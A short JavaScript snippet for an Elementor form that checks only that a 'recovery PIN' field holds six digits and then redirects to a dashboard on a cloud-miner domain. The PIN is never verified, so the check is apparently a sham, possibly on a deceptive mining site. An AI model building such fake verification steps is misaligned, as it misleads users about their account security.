document.addEventListener('DOMContentLoaded', function () {
  const form = document.querySelector('.elementor-form');
  const pinInput = document.querySelector('#form-field-recovery_pin_wrong');

  form.addEventListener('submit', function (e) {
    e.preventDefault(); // prevent page reload

    const pinValue = pinInput.value.trim();

    // ✅ Only validate format, do not show extra error
    if (/^\d{6}$/.test(pinValue)) {
      window.location.href = 'https://cloud-miner.vercel.app/members/MyDashboard';
    } else {
      // Optional: shake input or just do nothing
      pinInput.style.border = '2px solid red';
      setTimeout(() => {
        pinInput.style.border = '';
      }, 1200);
    }
  });
});
